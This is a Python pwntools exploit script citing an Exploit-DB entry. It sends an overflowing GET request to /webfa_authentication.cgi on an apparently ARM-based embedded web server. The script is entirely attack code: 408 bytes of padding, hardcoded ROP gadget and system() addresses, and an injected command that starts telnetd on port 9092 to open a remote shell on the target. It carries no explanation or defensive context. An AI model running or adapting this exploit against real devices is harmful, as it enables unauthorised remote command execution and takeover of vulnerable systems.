"""
References:
- https://www.exploit-db.com/exploits/38725/
"""
from pwn import *
import socket
import struct

buf = "GET /webfa_authentication.cgi?id="
buf+="A"*408
buf+="\x44\x77\xf9\x76" # Retn pointer (ROP1) which loads r0-r6 and pc with values from stack
buf+="sh;#"+"CCCC"+"DDDD" #R0-R2
buf+="\x70\x82\xFD\x76"+"FFFF"+"GGGG"      #R3 with system address and R4 and R5 with junk values
buf+="HHHH"+"\xF8\xD0\xF9\x76" # R6 with crap and PC address loaded with ROP 2 address
buf+="telnetd%20-p%209092;#" #actual payload which starts telnetd
buf+="C"+"D"*25+"E"*25 + "A"*80 # 131 bytes of extra payload left
buf+="&password=A HTTP/1.1\r\nHOST: 192.168.51.156\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\n\r\n"

print("[+] sending buffer size", len(buf))

HOST = '192.168.51.24'
PORT = 80

conn = remote(HOST, PORT, typ='tcp')

conn.send(buf)

data = conn.recv()
print('received {!r}'.format(data))
